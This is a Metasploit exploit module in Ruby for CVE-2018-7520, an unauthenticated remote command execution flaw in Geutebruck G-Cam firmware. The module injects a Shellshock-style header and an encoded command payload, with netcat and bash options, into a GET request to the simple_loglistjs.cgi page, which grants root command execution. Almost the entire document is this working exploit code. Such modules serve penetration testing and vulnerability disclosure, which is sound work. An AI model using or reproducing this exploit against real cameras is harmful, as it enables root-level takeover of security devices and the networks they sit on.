##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Geutebruck simple_loglistjs.cgi Remote Command Execution',
      'Description'    => %q{
        This module exploits a an arbitrary command execution vulnerability. The
        vulnerability exists in the /uapi-cgi/viewer/simple_loglistjs.cgi page and allows an
        anonymous user to execute arbitrary commands with root privileges.
        Firmware <= 1.12.0.19 are concerned.
        Tested on 5.02024 G-Cam/EFD-2250 running 1.12.0.4 firmware.
      },
      'Author'         =>
        [
          'Nicolas Mattiocco', #CVE-2018-7520 (RCE)
          'Davy Douhine' #CVE-2018-7520 (RCE) and metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2018-7520' ],
          [ 'URL', 'http://geutebruck.com' ],
          [ 'URL', 'https://ics-cert.us-cert.gov/advisories/ICSA-18-079-01' ]
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Space'       => 1024,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
              'RequiredCmd' => 'generic netcat bash',
            }
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        => [[ 'Automatic', { }]],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Mar 20 2018'))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path to webapp', '/uapi-cgi/viewer/simple_loglistjs.cgi']),
      ], self.class)
  end

  def exploit
    header = "(){ :;}; "
    encpayload = "#{header}#{payload.encoded}"
    uri = target_uri.path + "?" + Rex::Text.uri_encode(encpayload, "hex-all")
    print_status("#{rhost}:#{rport} - Attempting to exploit...")
    res = send_request_raw(
      {
        'method' => 'GET',
        'uri'    => uri
    })
  end

end